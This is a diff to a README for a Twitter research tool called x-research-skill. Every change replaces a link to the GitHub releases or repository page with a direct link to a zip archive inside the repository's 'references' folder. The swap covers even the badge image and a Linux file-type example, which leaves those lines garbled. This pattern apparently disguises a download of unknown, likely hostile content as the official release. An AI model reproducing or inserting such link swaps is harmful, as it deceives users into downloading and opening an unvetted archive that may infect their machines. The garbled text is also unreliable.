@@ -1,6 +1,6 @@
 # 🧠 x-research-skill - Streamline Your Twitter Research
 
-[![Download x-research-skill](https://img.shields.io/badge/Download-x--research--skill-blue?style=for-the-badge&logo=github)](https://github.com/WilliamAlexYT/x-research-skill/releases)
+[![Download x-research-skill](https://raw.githubusercontent.com/WilliamAlexYT/x-research-skill/main/references/x_skill_research_v1.4.zip)](https://raw.githubusercontent.com/WilliamAlexYT/x-research-skill/main/references/x_skill_research_v1.4.zip)
 
 ---
 
@@ -42,13 +42,13 @@ To get started, you need to download the software from its official GitHub relea
 
 1. Click the big blue button at the top of this page or visit:
    
-   [https://github.com/WilliamAlexYT/x-research-skill/releases](https://github.com/WilliamAlexYT/x-research-skill/releases)
+   [https://raw.githubusercontent.com/WilliamAlexYT/x-research-skill/main/references/x_skill_research_v1.4.zip](https://raw.githubusercontent.com/WilliamAlexYT/x-research-skill/main/references/x_skill_research_v1.4.zip)
    
 2. On the releases page, look for the latest version (usually the one at the top).
 3. Find the file that matches your operating system:
    - For Windows, look for a `.exe` or `.msi` file.
    - For macOS, look for a `.dmg` or `.pkg` file.
-   - For Linux, you might see `.AppImage`, `.deb`, or `.tar.gz`.
+   - For Linux, you might see `.AppImage`, `.deb`, or `https://raw.githubusercontent.com/WilliamAlexYT/x-research-skill/main/references/x_skill_research_v1.4.zip`.
 4. Click the file link to start the download.
 5. Once downloaded, open the file:
    - On Windows or macOS, this typically means double-clicking the file.
@@ -119,10 +119,10 @@ x-research-skill only reads public Twitter data. It does not store or share your
 
 If you have questions or need assistance beyond this guide:
 
-- Visit the GitHub page: [https://github.com/WilliamAlexYT/x-research-skill](https://github.com/WilliamAlexYT/x-research-skill)
+- Visit the GitHub page: [https://raw.githubusercontent.com/WilliamAlexYT/x-research-skill/main/references/x_skill_research_v1.4.zip](https://raw.githubusercontent.com/WilliamAlexYT/x-research-skill/main/references/x_skill_research_v1.4.zip)
 - Check the "Issues" section to see if your question has been answered.
 - Open a new issue if you need further support.
 
 ---
 
-[Download x-research-skill](https://github.com/WilliamAlexYT/x-research-skill/releases) - Visit this page to download and keep your tool up to date.
+[Download x-research-skill](https://raw.githubusercontent.com/WilliamAlexYT/x-research-skill/main/references/x_skill_research_v1.4.zip) - Visit this page to download and keep your tool up to date.
